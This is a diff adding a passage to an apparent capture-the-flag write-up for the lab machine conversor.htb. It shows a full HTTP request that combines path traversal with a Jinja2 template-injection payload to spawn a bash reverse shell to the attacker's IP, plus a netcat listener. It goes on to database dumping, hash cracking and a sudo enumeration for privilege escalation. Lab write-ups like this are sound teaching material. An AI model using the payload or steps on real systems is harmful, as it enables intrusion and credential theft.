@@ -102,7 +102,62 @@ def convert():
 
 #### Path Traversal + SSTI
 
+Knowing that Flask applications store their HTML templates in a /templates directory, we can combine the Path Traversal with a Server-Side Template Injection (SSTI) attack, I intercepted the upload request using Burp Suite and modified the xml_file filename to point to the about.html template. Instead of an XML file, I injected a Jinja2 payload designed to execute a reverse shell via Python's object introspection.
 
+#### Malicious HTTP Request:
+
+```HTTP
+POST /convert HTTP/1.1
+Host: conversor.htb
+Content-Type: multipart/form-data; boundary=----geckoformboundary
+Connection: close
+
+------geckoformboundary
+Content-Disposition: form-data; name="xml_file"; filename="../templates/about.html"
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Pwned by ZoldyckSec</h1>
+    {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.X/443 0>&1"').read() }}
+</body>
+</html>
+------geckoformboundary
+Content-Disposition: form-data; name="xslt_file"; filename="dummy.xslt"
+Content-Type: text/xml
+
+<root></root>
+------geckoformboundary--
+```
+
+> After sending the request, the server successfully overwrote the file. To trigger the payload, I set up a Netcat listener (nc -lvnp 443) and simply navigated to http://conversor.htb/about. The server rendered our malicious template, executing the reverse shell and granting access as the www-data user.
+
+## Lateral Movement
+
+Once inside the machine, I enumerated the web directory and found a SQLite database file at /var/www/conversor.htb/instance/app.db
+
+```bash
+www-data@conversor:/var/www/conversor.htb/instance$ sqlite3 app.db "SELECT * FROM users;"
+1|admin|admin@conversor.htb|[REDACTED]
+2|fismathack|fismathack@conversor.htb|306822292f7dc29fa05f2f45cc18b871****
+```
+> We obtained the MD5 hash for the user fismathack. I cracked it locally using CrackStaion
+
+> The password was cracked in seconds. I used these credentials to authenticate via SSH
+
+## Privilege Escalation 
+
+Checking the user's sudo privileges revealed an interesting entry:
+
+```bash
+fismathack@conversor:~$ sudo -l
+Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
+```
 
 
 
